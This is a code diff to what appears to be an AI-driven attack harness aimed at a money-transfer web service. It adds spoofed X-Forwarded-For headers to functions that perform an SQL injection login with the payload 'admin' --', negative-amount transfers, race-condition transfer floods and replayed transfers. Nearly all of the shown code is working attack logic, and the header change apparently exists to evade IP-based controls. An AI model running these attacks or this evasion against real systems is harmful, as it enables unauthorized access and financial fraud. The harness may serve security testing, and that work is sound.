@@ -43,7 +43,10 @@ def _session_token(state: SystemState) -> Optional[str]:
     t = eh.latest_session_token(state)
     if t:
         return t
-    with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
+    with httpx.Client(
+        timeout=_CLIENT_TIMEOUT,
+        headers=eh.merge_xff_headers(state, {}),
+    ) as client:
         return eh.obtain_token_via_sqli_login(client)
 
 
@@ -67,12 +70,9 @@ def _run_negative_transfer(state: SystemState, decision: LLMDecision) -> AttackE
     body: Dict[str, Any] = {"amount": amount, "to": to_user}
 
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
-            r = client.post(
-                url,
-                json=body,
-                headers={"Authorization": f"Bearer {token}"},
-            )
+        merged = eh.merge_xff_headers(state, {"Authorization": f"Bearer {token}"})
+        with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=merged) as client:
+            r = client.post(url, json=body)
     except Exception as e:
         return _be("negative_transfer", str(e), "failed")
 
@@ -104,14 +104,14 @@ def _run_race_condition(state: SystemState, decision: LLMDecision) -> AttackEven
         "to": str(pl.get("to", "race_target")),
     }
     url = eh.target_url("/transfer")
-    headers = {"Authorization": f"Bearer {token}"}
+    merged = eh.merge_xff_headers(state, {"Authorization": f"Bearer {token}"})
     results: List[Tuple[int, str]] = []
     lock = threading.Lock()
 
     def fire() -> None:
         try:
-            with httpx.Client(timeout=_CLIENT_TIMEOUT) as c:
-                r = c.post(url, json=body, headers=headers)
+            with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=merged) as c:
+                r = c.post(url, json=body)
             with lock:
                 results.append((r.status_code, r.text[:120]))
         except Exception as e:
@@ -159,12 +159,9 @@ def _run_replay(state: SystemState, decision: LLMDecision) -> AttackEvent:
             url = eh.target_url("/transfer")
             body = {"amount": 0.01, "to": "replay_user"}
             try:
-                with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
-                    r = client.post(
-                        url,
-                        json=body,
-                        headers={"Authorization": f"Bearer {token}"},
-                    )
+                merged = eh.merge_xff_headers(state, {"Authorization": f"Bearer {token}"})
+                with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=merged) as client:
+                    r = client.post(url, json=body)
                 return AttackEvent(
                     type="replay_attack",
                     target="/transfer",
@@ -180,7 +177,10 @@ def _run_replay(state: SystemState, decision: LLMDecision) -> AttackEvent:
 
     # Default replay: repeat SQLi login request (still demonstrative)
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
+        with httpx.Client(
+            timeout=_CLIENT_TIMEOUT,
+            headers=eh.merge_xff_headers(state, {}),
+        ) as client:
             r = client.post(
                 eh.target_url("/login"),
                 json={"username": "admin' --", "password": ""},
